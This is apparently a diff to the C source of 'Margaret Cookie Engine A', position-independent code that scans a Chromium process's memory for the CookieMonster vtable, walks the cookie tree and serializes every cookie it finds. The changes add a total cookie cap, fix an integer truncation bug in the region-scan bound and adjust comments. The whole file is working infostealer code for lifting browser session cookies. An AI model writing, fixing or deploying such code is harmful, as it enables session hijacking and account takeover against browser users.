@@ -51,6 +51,11 @@ static PIC_CODE pic_bool engine_a_write_u32(pic_u8 **cursor,
 
 /* --- CookieMonster tree walk --- */
 
+/* Whole-snapshot cap: the region scan stops at the next region
+ * boundary once this many cookies are serialized (the current jar
+ * usually yields far fewer; the cap bounds a pathological jar). */
+#define MARGARET_MAX_COOKIES_TOTAL 4096u
+/* Per-instance walk bound (one CookieMonster map). */
 #define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
 #define MARGARET_MAX_TREE_DEPTH 64u
 /* Instance cap; false-positive vtable hits are rejected by the walk
@@ -249,17 +254,6 @@ static PIC_CODE pic_bool engine_a_serialize_cookie(
 
 /* --- discovery + walk + serialize (main Engine A entry) --- */
 
-/*
- * Output format:
- *   [0..3]   magic "MCEA" (Margaret Cookie Engine A)
- *   [12..19] scan-end address; [20..27] last-hit address (diagnostics)
- *   [4..7]   cookie_count
- *   [8..11]  instance_count
- *   [12..15] reserved
- *   [16..]   serialized cookies (one after another)
- */
-#define MARGARET_ENGINE_A_MAGIC 0x4145434Du /* "MCEA" LE */
-
 PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
     PIC_CONTEXT *ctx,
     const MARGARET_CHROMIUM_ADAPTER *adapter,
@@ -387,17 +381,19 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
              * are cheap because the walk vetting rejects them without a
              * dereference, and the scan stops at the first cookie. */
             pic_uptr address = 0x10000u;
-            /* No byte budget: the caller's timeout is the bound.  The
+            /* No byte budget: the caller's timeout bounds the scan, but
+             * it is evaluated BETWEEN regions -- one region's inner
+             * scan (max 256 MB below) cannot be interrupted, so the
+             * effective bound can overshoot timeout_ms by seconds.  The
              * low-level scan is cheap in-process and the CM heap sits
-             * at a high entropy address, far past where a fixed budget
-             * expires. */
+             * at a high entropy address, far past where a fixed byte
+             * budget expires. */
             pic_bool stop = PIC_FALSE;
             pic_u32 start_ticks = get_tick_count();
             pic_u32 timeout_ms = args->timeout_ms;
-
             while (!stop &&
                    instance_count < MARGARET_MAX_INSTANCES &&
-                   cookie_count < MARGARET_MAX_COOKIES_PER_INSTANCE &&
+                   cookie_count < MARGARET_MAX_COOKIES_TOTAL &&
                    (timeout_ms == 0u ||
                     (pic_u32)(get_tick_count() - start_ticks) <= timeout_ms)) {
                 pic_uptr region_size;
@@ -420,13 +416,20 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
                         (mbi_protect & 0xEEu) != 0u && /* readable+exec */
                         (mbi_protect & PAGE_GUARD) == 0u) {
                         /* scan this region for qwords == vtable_va */
-                        const pic_u8 *region = (const pic_u8 *)mbi.BaseAddress;
-                        pic_u32 region_u32 = (pic_u32)region_size;
+                        const pic_u8 *region =
+                            (const pic_u8 *)mbi.BaseAddress;
+                        /* bound the region scan: clamp the full 64-bit
+                         * RegionSize BEFORE the cast -- (pic_u32)region_size
+                         * alone would wrap for committed regions above 4 GB
+                         * and silently skip the whole region instead of
+                         * scanning its first 256 MB */
+                        pic_u32 region_u32;
 
-                    /* bound the region scan */
-                    if (region_u32 > 256u * 1024u * 1024u) {
-                        region_u32 = 256u * 1024u * 1024u;
-                    }
+                        if (region_size > 256u * 1024u * 1024u) {
+                            region_u32 = 256u * 1024u * 1024u;
+                        } else {
+                            region_u32 = (pic_u32)region_size;
+                        }
 
                     /* 8-byte aligned scan */
                     for (pic_u32 offset = 0u;
@@ -572,7 +575,7 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
                             }
                         }
                     }
-                }
+                    }
                 }
 
                 address = (pic_uptr)mbi.BaseAddress + region_size;
